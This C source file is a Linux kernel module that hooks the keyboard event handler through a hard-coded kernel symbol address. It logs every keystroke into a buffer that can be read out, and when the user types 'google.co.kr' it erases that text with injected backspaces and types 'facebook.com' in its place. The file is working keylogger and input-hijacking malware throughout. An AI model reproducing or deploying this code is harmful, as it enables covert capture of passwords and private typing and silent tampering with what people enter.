#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <linux/fcntl.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/proc_fs.h>
#include <linux/consolemap.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/tty.h>
#include <linux/tty_flip.h>
#include <linux/mm.h>
#include <linux/string.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/irq.h>
#include <linux/kbd_kern.h>
#include <linux/kbd_diacr.h>
#include <linux/vt_kern.h>
#include <linux/sysrq.h>
#include <linux/input.h>
#include <linux/reboot.h>
#include <linux/notifier.h>
#include <linux/jiffies.h>
#include <asm/string_32.h>
#include <asm/io.h>
#include "kbd.h"
#include "char_scancode.h"

static const unsigned int scancode_str1[]={KEY_G, KEY_O, KEY_O, KEY_G, KEY_L, KEY_E, KEY_DOT, KEY_C, KEY_O, KEY_DOT, KEY_K, KEY_R};  // google.co.kr
static const unsigned int scancode_str2[]={KEY_F, KEY_A, KEY_C, KEY_E, KEY_B, KEY_O, KEY_O, KEY_K, KEY_DOT, KEY_C, KEY_O, KEY_M};  // facebook.com
static unsigned int str1_cnt = 0;
static const unsigned int str1_len = sizeof(scancode_str1)/4;
static const unsigned int str2_len = sizeof(scancode_str2)/4;
static struct input_handler * p_kbd_handler=(struct input_handler*)0xc09e9668;  // kallsyms -> kbd_handler
static struct input_handle * h_handle;
static void (*org_kbd_event)(struct input_handle *handle, unsigned int event_type, unsigned int event_code, int value);

extern char g_buffer[30];
extern wait_queue_head_t wait_queue_read;
extern int mask;

inline char * to_special_characters(const unsigned long scancode)
{
	char * ptr;

	if(scancode==57)
		ptr=" ";
	else if(scancode==1)
		ptr="<ESC>";
	else if(scancode==28)
		ptr="<ENTER>\n";
	else if(scancode==29)
		ptr="<CTRL>";
	else if(scancode==56)
		ptr="<ALT>";
	else if(scancode==15)
		ptr="<TAB>\t";
	else if(scancode==58)
		ptr="<CAPS LOCK>";
	else if(scancode==14)
		ptr="<BACK SPACE>";
	else if(scancode==41)
		ptr="`";
	else if(scancode==12 || scancode==74)
		ptr="-";
	else if(scancode==13)
		ptr="=";
	else if(scancode==26)
		ptr="[";
	else if(scancode==27)
		ptr="]";
	else if(scancode==43)
		ptr="\\";
	else if(scancode==39)
		ptr=";";
	else if(scancode==40)
		ptr="'";
	else if(scancode==51)
		ptr=",";
	else if(scancode==52)
		ptr=".";
	else if(scancode==53 || scancode==224)
		ptr="/";
	else if(scancode==55)
		ptr="*";
	else if(scancode==78)
		ptr="+";
	else if(scancode==2)
		ptr="1";
	else if(scancode==3)
		ptr="2";
	else if(scancode==4)
		ptr="3";
	else if(scancode==5)
		ptr="4";
	else if(scancode==6)
		ptr="5";
	else if(scancode==7)
		ptr="6";
	else if(scancode==8)
		ptr="7";
	else if(scancode==9)
		ptr="8";
	else if(scancode==10)
		ptr="9";
	else if(scancode==11)
		ptr="0";
	else
		ptr=NULL;

	return ptr;
}

inline char * to_small_letter(const unsigned long scancode)
{
	char * ptr;

	if(scancode==30)
		ptr="a";
	else if(scancode==48)
		ptr="b";
	else if(scancode==46)
		ptr="c";
	else if(scancode==32)
		ptr="d";
	else if(scancode==18)
		ptr="e";
	else if(scancode==33)
		ptr="f";
	else if(scancode==34)
		ptr="g";
	else if(scancode==35)
		ptr="h";
	else if(scancode==23)
		ptr="i";
	else if(scancode==36)
		ptr="j";
	else if(scancode==37)
		ptr="k";
	else if(scancode==38)
		ptr="l";
	else if(scancode==50)
		ptr="m";
	else if(scancode==49)
		ptr="n";
	else if(scancode==24)
		ptr="o";
	else if(scancode==25)
		ptr="p";
	else if(scancode==16)
		ptr="q";
	else if(scancode==19)
		ptr="r";
	else if(scancode==31)
		ptr="s";
	else if(scancode==20)
		ptr="t";
	else if(scancode==22)
		ptr="u";
	else if(scancode==47)
		ptr="v";
	else if(scancode==17)
		ptr="w";
	else if(scancode==45)
		ptr="x";
	else if(scancode==21)
		ptr="y";
	else if(scancode==44)
		ptr="z";
	else
		ptr=NULL;

	return ptr;
}

inline char * scancode_to_string(const unsigned long scancode)
{
	char * ptr = to_small_letter(scancode);
	if(ptr==NULL)
		ptr = to_special_characters(scancode);
	
	return ptr;
}

inline void key_processor(unsigned long scancode)
{
	char * ptr;

	ptr = scancode_to_string(scancode);
	if(ptr==NULL)
		return;

	strcpy(g_buffer, ptr);
	mask |= POLLIN | POLLRDNORM;
	wake_up_interruptible(&wait_queue_read);
}

inline void str_insert(void)
{
	uint32_t cnt;

	/* delete string */
	for(cnt=0;cnt<str1_len;cnt++)
		org_kbd_event(h_handle, 1, KEY_BACKSPACE, 1);  // 1 is insert value

	/* insert string */
	for(cnt=0;cnt<str2_len;cnt++)
		org_kbd_event(h_handle, 1, scancode_str2[cnt], 1);  // 1 is insert value
}

inline int insert_check(unsigned int event_type, unsigned int event_code, int value)
{
	if(event_type==0 || value==0 || (event_type==4 && event_code==4))
		return 0;

	key_processor(event_code);  // key logger function

	if(scancode_str1[str1_cnt]==event_code)
	{
		str1_cnt++;
		if(str1_len==str1_cnt)
		{
			str1_cnt=0;
			return 1;
		}
	}
	else if(KEY_BACKSPACE==event_code)
	{
		if(str1_cnt!=0)
			str1_cnt--;
	}
	else
	{
		str1_cnt=0;
	}
	return 0;
}

static void pseudo_kbd_event(struct input_handle *handle, unsigned int event_type, unsigned int event_code, int value)
{
	int inject;

	inject = insert_check(event_type, event_code, value);
	org_kbd_event(handle, event_type, event_code, value);  // i8042 interrupt (key interrupt)
	if(inject)
		str_insert();
}

static void temp_kbd_event(struct input_handle *handle, unsigned int event_type, unsigned int event_code, int value)
{
	h_handle = handle;  // handle save
	org_kbd_event(handle, event_type, event_code, value);
	/* kbd_event() hook 2 */
	p_kbd_handler->event = pseudo_kbd_event;
}

int kbd_init(void)
{
	/* kbd_event() hook 1 */
	org_kbd_event = p_kbd_handler->event;
	p_kbd_handler->event = temp_kbd_event;
	return 0;
}

void kbd_term(void)
{
	/* kbd_event() unhook */
	p_kbd_handler->event = org_kbd_event;
}
